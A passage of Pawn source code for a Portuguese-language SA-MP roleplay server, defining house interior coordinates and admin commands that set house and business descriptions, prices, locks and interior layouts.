			hInfo[id][ExitZ] = 1083.969971;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/4 bedrooms/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 18:
        {
			hInfo[id][ExitX] = 234.045990;
			hInfo[id][ExitY] = 1064.879883;
			hInfo[id][ExitZ] = 1084.309937;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 19:
        {
			hInfo[id][ExitX] = -68.294098;
			hInfo[id][ExitY] = 1353.469971;
			hInfo[id][ExitZ] = 1080.279907;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/NO BEDROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 20:
        {
			hInfo[id][ExitX] = -285.548981;
			hInfo[id][ExitY] = 1470.979980;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: 1 bedroom/living room/kitchen/NO BATHROOM", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 21:
        {
			hInfo[id][ExitX] = -42.581997;
			hInfo[id][ExitY] = 1408.109985;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 8;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/NO BEDROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 22:
        {
			hInfo[id][ExitX] = 83.345093;
			hInfo[id][ExitY] = 1324.439941;
			hInfo[id][ExitZ] = 1083.889893;
			hInfo[id][Interior] = 9;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/2 story/2 bedrooms", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 23:
        {
			hInfo[id][ExitX] = 260.941986;
			hInfo[id][ExitY] = 1238.509888;
			hInfo[id][ExitZ] = 1084.259888;
			hInfo[id][Interior] = 9;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 24:
        {
			hInfo[id][ExitX] = 244.411987;
			hInfo[id][ExitY] = 305.032990;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Denise's Bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 25:
        {
			hInfo[id][ExitX] = 271.884979;
			hInfo[id][ExitY] = 306.631989;
			hInfo[id][ExitZ] = 999.325989;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Katie's Bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 26:
        {
			hInfo[id][ExitX] = 291.282990;
			hInfo[id][ExitY] = 310.031982;
			hInfo[id][ExitZ] = 999.154968;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Helena's Bedroom (barn) - limited movement.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 27:
        {
			hInfo[id][ExitX] = 302.181000;
			hInfo[id][ExitY] = 300.722992;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Michelle's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 28:
        {
			hInfo[id][ExitX] = 322.197998;
			hInfo[id][ExitY] = 302.497986;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Barbara's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 29:
        {
			hInfo[id][ExitX] = 346.870025;
			hInfo[id][ExitY] = 309.259033;
			hInfo[id][ExitZ] = 999.155700;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Millie's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 30:
        {
			hInfo[id][ExitX] = 2496.049805;
			hInfo[id][ExitY] = -1693.929932;
			hInfo[id][ExitZ] = 1014.750000;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: CJ's Mom's House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 31:
        {
			hInfo[id][ExitX] = 1263.079956;
			hInfo[id][ExitY] = -785.308960;
			hInfo[id][ExitZ] = 1091.959961;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Madd Dogg's Mansion (West door).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 32:
        {
			hInfo[id][ExitX] = 2464.109863;
			hInfo[id][ExitY] = -1698.659912;
			hInfo[id][ExitZ] = 1013.509949;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Ryder's house.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 33:
        {
			hInfo[id][ExitX] = 2526.459961;
			hInfo[id][ExitY] = -1679.089966;
			hInfo[id][ExitZ] = 1015.500000;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Sweet's House (South side of house is fucked).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 34:
        {
			hInfo[id][ExitX] = 2543.659912;
			hInfo[id][ExitY] = -1303.629883;
			hInfo[id][ExitZ] = 1025.069946;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Big Smoke's Crack Factory (Ground Floor).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 35:
        {
			hInfo[id][ExitX] = 744.542969;
			hInfo[id][ExitY] = 1437.669922;
			hInfo[id][ExitZ] = 1102.739990;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Fanny Batter's Whore House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 36:
        {
			hInfo[id][ExitX] = 964.106995;
			hInfo[id][ExitY] = -53.205498;
			hInfo[id][ExitZ] = 1001.179993;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Tiger Skin Rug Brothel.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 37:
        {
			hInfo[id][ExitX] = 2350.339844;
			hInfo[id][ExitY] = -1181.649902;
			hInfo[id][ExitZ] = 1028.000000;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Burning Desire Gang House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 38:
        {
			hInfo[id][ExitX] = 2807.619873;
			hInfo[id][ExitY] = -1171.899902;
			hInfo[id][ExitZ] = 1025.579956;
			hInfo[id][Interior] = 8;
			format(string, sizeof string, "Casa: %d - Descrição: Colonel Furhberger's House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 39:
        {
			hInfo[id][ExitX] = 318.564972;
			hInfo[id][ExitY] = 1118.209961;
			hInfo[id][ExitZ] = 1083.979980;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Crack Den.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 40:
        {
			hInfo[id][ExitX] = 2324.419922;
			hInfo[id][ExitY] = -1147.539917;
			hInfo[id][ExitZ] = 1050.719971;
			hInfo[id][Interior] = 12;
			format(string, sizeof string, "Casa: %d - Descrição: Unused Safe House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 41:
        {
			hInfo[id][ExitX] = 446.622986;
			hInfo[id][ExitY] = 509.318970;
			hInfo[id][ExitZ] = 1001.419983;
			hInfo[id][Interior] = 12;
			format(string, sizeof string, "Casa: %d - Descrição: Budget Inn Motel Room.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 42:
        {
			hInfo[id][ExitX] = 2216.339844;
			hInfo[id][ExitY] = -1150.509888;
			hInfo[id][ExitZ] = 1025.799927;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Jefferson Motel. (REALLY EXPENSIVE)", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 43:
        {
			hInfo[id][ExitX] = 1451.8270;
			hInfo[id][ExitY] = 2458.4133;
			hInfo[id][ExitZ] = -27.7464;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: TENDA", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 44:
        {
			hInfo[id][ExitX] = 2392.7415;
			hInfo[id][ExitY] = -1714.5696;
			hInfo[id][ExitZ] = -46.7258;
			hInfo[id][Interior] = 0;
			format(string, sizeof string, "Casa: %d - Descrição: Caravana - Journey", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
        case 45:
        {
			hInfo[id][ExitX] = 1612.906738;
			hInfo[id][ExitY] = 613.277405;
			hInfo[id][ExitZ] = 2.310597;
			hInfo[id][Interior] = 0;
			format(string, sizeof string, "Casa: %d - Descrição: Caravana - Tropic", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
    }
	GuardarCasa(id);

	return 1;
}

COMMAND:ahousedesc(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[32];

    if(sscanf(params, "ds[32]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahousedesc <id> <descrição>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	
	format(hInfo[id][Nome], 32, "%s", nome);
	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Mudaste a descrição da casa %d para %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ahousesell(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizsell <id>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	if(hInfo[id][Comprada] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa casa não está comprada");

	hInfo[id][Comprada] = 0;
	hInfo[id][Locked] = 1;
	hInfo[id][Bank] = 0;
	hInfo[id][PickupID] = 1273;
	hInfo[id][AluguerStatus] = 0;
	hInfo[id][Aluguer] = 0;
	hInfo[id][Arma1] = 0;
	hInfo[id][Ammo1] = 0;
	hInfo[id][Arma2] = 0;
	hInfo[id][Ammo2] = 0;
	hInfo[id][Arma3] = 0;
	hInfo[id][Ammo3] = 0;
	format(hInfo[id][Nome], 32, "%s", "Unused");
	format(hInfo[id][Owner], 32, "%s", "Ninguém");

	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Vendeste a casa %d", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ahouselock(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouselock <id>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	if(hInfo[id][Locked] == 0)
	{
        format(string, sizeof(string), "Trancaste a casa %d", id);
        hInfo[id][Locked] = 1;
	}
	else
	{
        format(string, sizeof(string), "Destrancaste a casa %d", id);
        hInfo[id][Locked] = 0;
	}
	GuardarCasa(id);

    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ahouseprice(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, price;

    if(sscanf(params, "dd", id, price)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouseprice <id> <preço>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	hInfo[id][Price] = price;
	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Setaste a casa %d para custar %d$", id, price);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ahouseentrance(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouseentrance <id>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	new Float:x, Float:y, Float:z, VW, Int, Float:a;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	hInfo[id][EnterX] = x;
	hInfo[id][EnterY] = y;
 	hInfo[id][EnterZ] = z;
 	hInfo[id][EnterAngle] = a;
 	hInfo[id][EnterInterior] = Int;
 	hInfo[id][EnterVirtualWorld] = VW;
	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Setaste a entrada da casa %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:resethouses(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new i, Float:distance = 6.0, Float:metres = distance, Float:a;

	for(; i < sizeof(hInfo); i++, metres += distance)
	{
	    if(i == 0) continue;

		GetPlayerPos(playerid, hInfo[i][EnterX], hInfo[i][EnterY], hInfo[i][EnterZ]);
		GetPlayerFacingAngle(playerid, a);

		hInfo[i][EnterX] += (metres * floatsin(-a, degrees));
		hInfo[i][EnterY] += (metres * floatcos(-a, degrees));
		hInfo[i][EnterInterior] = 0;
		hInfo[i][EnterVirtualWorld] = 0;
        hInfo[i][ExitX] = 0;
		hInfo[i][ExitY] = 0;
		hInfo[i][ExitZ] = 0;
		hInfo[i][ExitAngle] = 0;
		hInfo[i][Interior] = 0;
		hInfo[i][VirtualWorld] = i;
		hInfo[i][Comprada] = 0;
		hInfo[i][Price] = 0;
		hInfo[i][Locked] = 0;
		hInfo[i][Bank] = 0;
		hInfo[i][PickupID] = 1273;
		hInfo[i][AluguerStatus] = 0;
		hInfo[i][Aluguer] = 0;
		hInfo[i][Arma1] = 0;
		hInfo[i][Ammo1] = 0;
		hInfo[i][Arma2] = 0;
		hInfo[i][Ammo2] = 0;
		hInfo[i][Arma3] = 0;
		hInfo[i][Ammo3] = 0;
		hInfo[i][IsCaravana] = 0;
		hInfo[i][GaragemEnterX] = 0;
		hInfo[i][GaragemEnterY] = 0;
		hInfo[i][GaragemEnterZ] = 0;
		hInfo[i][GaragemEnterInterior] = 0;
		hInfo[i][GaragemEnterVirtualWorld] = 0;
		hInfo[i][GaragemExitX] = 0;
		hInfo[i][GaragemExitY] = 0;
		hInfo[i][GaragemExitZ] = 0;
		hInfo[i][GaragemExitAngle] = 0;
		hInfo[i][GaragemVirtualWorld] = 0;
		hInfo[i][GaragemPickupID] = 2485;
		hInfo[i][GaragemLocked] = 0;
		
  		format(hInfo[i][Nome], 32, "%s", "Unused");
    	format(hInfo[i][Owner], 32, "%s", "Ninguém");

		GuardarCasa(i);
		AtualizarCasa(i);
	}

    SendClientMessage(playerid, COLOR_INFO, "Deste reset a todas as casas do servidor");

    return 1;
}

COMMAND:abizcmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de BUSINESSES:] {FFFFFF}/resetbizzes - /abizprice - /abiztype - /abizentrance");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de BUSINESSES:] {FFFFFF}/abizproducts - /abizint - /abizlock - /abizsell - /abizconfig - /abizlockall");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    
    return 1;
}

COMMAND:abizlockall(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	for(new i = 0; i < MAX_BUSINESS; i++)
	{
	    if(i == 0) continue;
	    
	    bInfo[i][Locked] = 1;
	}

    SendClientMessage(playerid, COLOR_INFO, "Trancaste todas as lojas do servidor.");

	return 1;
}

COMMAND:abizconfig(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[32];

    if(sscanf(params, "ds[32]", id, nome))
    {
        SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abizconfig <id> <config>");
        SendClientMessage(playerid, COLOR_CHAT, "[Configs]: {FFFFFF}restaurante - bar - 247 - gasolina - tele - stand - caça - roupa - farmácia - apostas - seguradora - ccomercial");
        return 1;
    }
    if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

 	if(strcmp(nome, "restaurante", true) == 0)
    {
        bInfo[id][Price] = 165000;
        bInfo[id][Type] = BTYPE_RESTAURANTE;
        
        new rand = random(6);
        
        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = 363.1974;
				bInfo[id][ExitY] = -74.8233;
				bInfo[id][ExitZ] = 1001.5078;

				bInfo[id][Interior] = 10;

				bInfo[id][ActorX] = 376.4986;
				bInfo[id][ActorY] = -65.8491;
				bInfo[id][ActorZ] = 1001.5078;
				bInfo[id][ActorAngle] = 179.6272;
				bInfo[id][ActorModel] = 205;
			}
			case 1:
			{
				bInfo[id][ExitX] = 365.672974;
				bInfo[id][ExitY] = -10.713200;
				bInfo[id][ExitZ] = 1001.869995;

				bInfo[id][Interior] = 9;

				bInfo[id][ActorX] = 368.1107;
				bInfo[id][ActorY] = -4.4927;
				bInfo[id][ActorZ] = 1001.8516;
				bInfo[id][ActorAngle] = 177.1600;
				bInfo[id][ActorModel] = 167;
			}
			case 2:
			{
				bInfo[id][ExitX] = 372.351990;
				bInfo[id][ExitY] = -131.650986;
				bInfo[id][ExitZ] = 1001.449951;

				bInfo[id][Interior] = 5;

				bInfo[id][ActorX] = 374.7303;
				bInfo[id][ActorY] = -117.2787;
				bInfo[id][ActorZ] = 1001.4922;
				bInfo[id][ActorAngle] = 178.0372;
				bInfo[id][ActorModel] = 155;
			}
			case 3:
			{
				bInfo[id][ExitX] = 377.098999;
				bInfo[id][ExitY] = -192.439987;
				bInfo[id][ExitZ] = 1000.643982;

				bInfo[id][Interior] = 17;

				bInfo[id][ActorX] = 380.7200;
				bInfo[id][ActorY] = -189.1140;
				bInfo[id][ActorZ] = 1000.6328;
				bInfo[id][ActorAngle] = 180.1055;
				bInfo[id][ActorModel] = 194;
			}
			case 4:
			{
				bInfo[id][ExitX] = 460.099976;
				bInfo[id][ExitY] = -88.428497;
				bInfo[id][ExitZ] = 999.621948;

				bInfo[id][Interior] = 4;

				bInfo[id][ActorX] = 449.3911;
				bInfo[id][ActorY] = -82.2323;
				bInfo[id][ActorZ] = 999.5547;
				bInfo[id][ActorAngle] = 180.7716;
				bInfo[id][ActorModel] = 194;
			}
			case 5:
			{
				bInfo[id][ExitX] = 681.474976;
				bInfo[id][ExitY] = -451.150970;
				bInfo[id][ExitZ] = -25.616798;

				bInfo[id][Interior] = 1;

				bInfo[id][ActorX] = 681.4504;
				bInfo[id][ActorY] = -455.4607;
				bInfo[id][ActorZ] = -25.6099;
				bInfo[id][ActorAngle] = 359.5614;
				bInfo[id][ActorModel] = 9;
			}
        }
	}
	else if(strcmp(nome, "bar", true) == 0)
	{
        bInfo[id][Price] = 155000;
        bInfo[id][Type] = BTYPE_BAR;
        
        new rand = random(3);

        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = 493.3351;
				bInfo[id][ExitY] = -24.6042;
				bInfo[id][ExitZ] = 1000.6797;

				bInfo[id][Interior] = 17;

				bInfo[id][ActorX] = 501.8495;
				bInfo[id][ActorY] = -21.4766;
				bInfo[id][ActorZ] = 1000.6797;
				bInfo[id][ActorAngle] = 87.3976;
				bInfo[id][ActorModel] = 194;
			}
			case 1:
			{
				bInfo[id][ExitX] = 501.980988;
				bInfo[id][ExitY] = -69.150200;
				bInfo[id][ExitZ] = 998.834961;

				bInfo[id][Interior] = 11;

				bInfo[id][ActorX] = 499.7752;
				bInfo[id][ActorY] = -77.5624;
				bInfo[id][ActorZ] = 998.7651;
				bInfo[id][ActorAngle] = 2.6041;
				bInfo[id][ActorModel] = 194;
			}
			case 2:
			{
				bInfo[id][ExitX] = -228.9999;
				bInfo[id][ExitY] = 1401.5785;
				bInfo[id][ExitZ] = 27.769798;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = -223.3081;
				bInfo[id][ActorY] = 1406.1765;
				bInfo[id][ActorZ] = 27.7734;
				bInfo[id][ActorAngle] = 82.4471;
				bInfo[id][ActorModel] = 194;
			}
        }
	}
	else if(strcmp(nome, "247", true) == 0)
	{
        bInfo[id][Price] = 180000;
        bInfo[id][Type] = BTYPE_247;
        
        new rand = random(4);

        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = -25.884499;
				bInfo[id][ExitY] = -185.868988;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = 0;
				bInfo[id][ActorY] = 0;
				bInfo[id][ActorZ] = 0;
				bInfo[id][ActorAngle] = 0;
				bInfo[id][ActorModel] = 0;
			}
			case 1:
			{
				bInfo[id][ExitX] = 6.091180;
				bInfo[id][ExitY] = -31.271898;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 10;

				bInfo[id][ActorX] = 3.3154;
				bInfo[id][ActorY] = -30.7009;
				bInfo[id][ActorZ] = 1003.5494;
				bInfo[id][ActorAngle] = 359.1631;
				bInfo[id][ActorModel] = 194;
			}
			case 2:
			{
				bInfo[id][ExitX] = -30.946699;
				bInfo[id][ExitY] = -91.609596;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = -26.9505;
				bInfo[id][ActorY] = -91.6199;
				bInfo[id][ActorZ] = 1003.5469;
				bInfo[id][ActorAngle] = 3.7378;
				bInfo[id][ActorModel] = 194;
			}
			case 3:
			{
				bInfo[id][ExitX] = -25.132599;
				bInfo[id][ExitY] = -141.066986;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 16;

				bInfo[id][ActorX] = -20.8918;
				bInfo[id][ActorY] = -140.3370;
				bInfo[id][ActorZ] = 1003.5469;
				bInfo[id][ActorAngle] = 359.5393;
				bInfo[id][ActorModel] = 194;
			}
        }
	}
	else if(strcmp(nome, "gasolina", true) == 0)
	{
        bInfo[id][Price] = 230000;
        bInfo[id][Type] = BTYPE_GASOLINA;
        
        new rand = random(4);

        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = -25.884499;
				bInfo[id][ExitY] = -185.868988;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = 0;
				bInfo[id][ActorY] = 0;
				bInfo[id][ActorZ] = 0;
				bInfo[id][ActorAngle] = 0;
				bInfo[id][ActorModel] = 0;
			}
			case 1:
			{
				bInfo[id][ExitX] = 6.091180;
				bInfo[id][ExitY] = -31.271898;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 10;

				bInfo[id][ActorX] = 3.3154;
				bInfo[id][ActorY] = -30.7009;
				bInfo[id][ActorZ] = 1003.5494;
				bInfo[id][ActorAngle] = 359.1631;
				bInfo[id][ActorModel] = 194;
			}
			case 2:
			{
				bInfo[id][ExitX] = -30.946699;
				bInfo[id][ExitY] = -91.609596;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = -26.9505;
				bInfo[id][ActorY] = -91.6199;
				bInfo[id][ActorZ] = 1003.5469;
				bInfo[id][ActorAngle] = 3.7378;
				bInfo[id][ActorModel] = 194;
			}
			case 3:
			{
				bInfo[id][ExitX] = -25.132599;
				bInfo[id][ExitY] = -141.066986;
				bInfo[id][ExitZ] = 1003.549988;

				bInfo[id][Interior] = 16;

				bInfo[id][ActorX] = -20.8918;
				bInfo[id][ActorY] = -140.3370;
				bInfo[id][ActorZ] = 1003.5469;
				bInfo[id][ActorAngle] = 359.5393;
				bInfo[id][ActorModel] = 194;
			}
        }
	}
	else if(strcmp(nome, "tele", true) == 0)
	{
        bInfo[id][Price] = 130000;
        bInfo[id][Type] = BTYPE_TELE;
        
		bInfo[id][ExitX] = -2240.569824;
		bInfo[id][ExitY] = 128.020996;
		bInfo[id][ExitZ] = 1035.419922;

		bInfo[id][Interior] = 6;

		bInfo[id][ActorX] = -2238.0476;
		bInfo[id][ActorY] = 128.5868;
		bInfo[id][ActorZ] = 1035.4141;
		bInfo[id][ActorAngle] = 0.9806;
		bInfo[id][ActorModel] = 289;
	}
	else if(strcmp(nome, "stand", true) == 0)
	{
        bInfo[id][Price] = 1000000;
        bInfo[id][Type] = BTYPE_STAND;
        
		bInfo[id][ExitX] = 2828.0786;
		bInfo[id][ExitY] = -1679.4679;
		bInfo[id][ExitZ] = 663.8648;
		bInfo[id][ExitAngle] = 179.1772;

		bInfo[id][Interior] = 0;
	}
	else if(strcmp(nome, "caça", true) == 0)
	{
        bInfo[id][Price] = 230000;
        bInfo[id][Type] = BTYPE_CACA;
        
        new rand = random(2);

        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = 285.800995;
				bInfo[id][ExitY] = -86.547600;
				bInfo[id][ExitZ] = 1001.539978;

				bInfo[id][Interior] = 4;

				bInfo[id][ActorX] = 295.5957;
				bInfo[id][ActorY] = -82.5282;
				bInfo[id][ActorZ] = 1001.5156;
				bInfo[id][ActorAngle] = 355.4659;
				bInfo[id][ActorModel] = 179;
			}
			case 1:
			{
				bInfo[id][ExitX] = 296.919983;
				bInfo[id][ExitY] = -111.071999;
				bInfo[id][ExitZ] = 1001.569946;

				bInfo[id][Interior] = 6;

				bInfo[id][ActorX] = 291.4510;
				bInfo[id][ActorY] = -104.4912;
				bInfo[id][ActorZ] = 1001.5156;
				bInfo[id][ActorAngle] = 179.2061;
				bInfo[id][ActorModel] = 179;
			}
        }
	}
	else if(strcmp(nome, "roupa", true) == 0)
	{
        bInfo[id][Price] = 160000;
        bInfo[id][Type] = BTYPE_ROUPA;
        
        new rand = random(6);

        switch(rand)
        {
			case 0:
			{
				bInfo[id][ExitX] = 204.3197;
				bInfo[id][ExitY] = -168.4327;
				bInfo[id][ExitZ] = 1000.578979;

				bInfo[id][Interior] = 14;

				bInfo[id][ActorX] = 204.4223;
				bInfo[id][ActorY] = -157.8301;
				bInfo[id][ActorZ] = 1000.5234;
				bInfo[id][ActorAngle] = 179.2678;
				bInfo[id][ActorModel] = 211;
			}
			case 1:
			{
				bInfo[id][ExitX] = 207.6663;
				bInfo[id][ExitY] = -110.5711;
				bInfo[id][ExitZ] = 1005.269958;

				bInfo[id][Interior] = 15;

				bInfo[id][ActorX] = 208.8333;
				bInfo[id][ActorY] = -98.7053;
				bInfo[id][ActorZ] = 1005.2578;
				bInfo[id][ActorAngle] = 178.5156;
				bInfo[id][ActorModel] = 211;
			}
			case 2:
			{
				bInfo[id][ExitX] = 207.054993;
				bInfo[id][ExitY] = -138.804993;
				bInfo[id][ExitZ] = 1003.519958;

				bInfo[id][Interior] = 3;

				bInfo[id][ActorX] = 207.0232;
				bInfo[id][ActorY] = -127.8072;
				bInfo[id][ActorZ] = 1003.5078;
				bInfo[id][ActorAngle] = 179.7063;
				bInfo[id][ActorModel] = 211;
			}
			case 3:
			{
				bInfo[id][ExitX] = 203.8892;
				bInfo[id][ExitY] = -50.1709;
				bInfo[id][ExitZ] = 1001.799988;

				bInfo[id][Interior] = 1;

				bInfo[id][ActorX] = 203.2186;
				bInfo[id][ActorY] = -41.6711;
				bInfo[id][ActorZ] = 1001.8047;
				bInfo[id][ActorAngle] = 178.0142;
				bInfo[id][ActorModel] = 211;
			}
			case 4:
			{
				bInfo[id][ExitX] = 226.293991;
				bInfo[id][ExitY] = -7.431530;
				bInfo[id][ExitZ] = 1002.259949;

				bInfo[id][Interior] = 5;

				bInfo[id][ActorX] = 204.8535;
				bInfo[id][ActorY] = -7.2751;
				bInfo[id][ActorZ] = 1001.2109;
				bInfo[id][ActorAngle] = 265.3326;
				bInfo[id][ActorModel] = 211;
			}
			case 5:
			{
				bInfo[id][ExitX] = 161.3083;
				bInfo[id][ExitY] = -96.3637;
				bInfo[id][ExitZ] = 1001.804687;

				bInfo[id][Interior] = 18;

				bInfo[id][ActorX] = 162.7960;
				bInfo[id][ActorY] = -81.1917;
				bInfo[id][ActorZ] = 1001.8047;
				bInfo[id][ActorAngle] = 180.2932;
				bInfo[id][ActorModel] = 211;
			}
        }
	}
	else if(strcmp(nome, "farmácia", true) == 0)
	{
        bInfo[id][Price] = 170000;
        bInfo[id][Type] = BTYPE_FARMACIA;
        
		bInfo[id][ExitX] = -2240.569824;
